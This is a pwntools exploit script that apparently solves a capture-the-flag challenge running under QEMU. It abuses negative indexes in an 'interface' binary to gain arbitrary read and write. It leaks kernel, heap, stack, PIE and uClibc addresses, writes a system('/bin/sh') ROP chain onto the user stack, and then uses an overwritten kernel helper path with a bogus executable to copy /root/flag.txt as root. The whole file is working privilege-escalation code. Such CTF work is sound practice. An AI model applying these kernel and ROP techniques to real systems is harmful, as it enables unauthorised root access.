from pwn import * 

if args.DBG:
    p = process('./dbg.sh')
else:
    p = process('./start-qemu.sh')
e = ELF('./interface')
libc = ELF('./libuClibc-1.0.40.so')

sendlineafter = lambda x, y: p.sendlineafter(x, y)
recvuntil = lambda x: p.recvuntil(x)

def edit(index, size, data):
    sendlineafter(b'> ', b'2')
    sendlineafter(b': ', str(index))
    sendlineafter(b': ', str(size))
    sendlineafter(b': ', b' '.join(map(lambda x: f'{x: 02x}'.encode(), data)))

def show(index, size):
    sendlineafter(b'> ', b'3')
    sendlineafter(b': ', str(index))
    sendlineafter(b': ', str(size))
    recvuntil(b': ')
    data = b''
    for i in p.recvline()[:-1].split():
        data += bytes([int(i, 16)])
    return data

def aar(addr, size):
    edit(-6, 8, p64(addr))
    return show(-2, size)

def aaw(addr, data):
    edit(-6, 8, p64(addr))
    edit(-2, len(data), data)

mbase = u64(show(-5, 8)) - 0x23d0
log.info('mbase: ' + hex(mbase)) 
kbase = u64(show(-24, 0x58)[0x50:]) - 0xeabbc0
log.info('kbase: ' + hex(kbase))

edit(-5, 1, b'\xf0')
kheap = u64(aar(mbase+0x2208, 8))
log.info('kheap: ' + hex(kheap))
kstack = u64(aar(kheap, 0x90)[0x88:])
log.info('kstack: ' + hex(kstack))
e.address = u64(aar(kstack+0xcff70, 8)) - e.symbols['_start']
log.info('PIE: ' + hex(e.address))
libc.address = u64(aar(e.got['printf'], 8)) - libc.symbols['printf']
log.info('libc: ' + hex(libc.address))
ustack = u64(aar(libc.symbols['environ'], 8)) - 0xe0
log.info('ustack: ' + hex(ustack))

pop_rdi = 0x00019e64 + libc.address
aaw(kbase+0xe38480, b'/tmp/x\0')
aaw(ustack, p64(pop_rdi))
aaw(ustack+0x8, p64(next(libc.search(b'/bin/sh'))))
aaw(ustack+0x10, p64(libc.symbols['system']))
p.sendlineafter(b'> ', b'5')

p.sendlineafter(b'$ ', b"echo '#!/bin/sh\ncp /root/flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x")
p.sendlineafter(b'$ ', b"chmod +x /tmp/x")
p.sendlineafter(b'$ ', b"echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy")
p.sendlineafter(b'$ ', b"chmod +x /tmp/dummy")
p.sendlineafter(b'$ ', b"/tmp/dummy")
p.sendlineafter(b'$ ', b"cat /tmp/flag")
p.interactive()
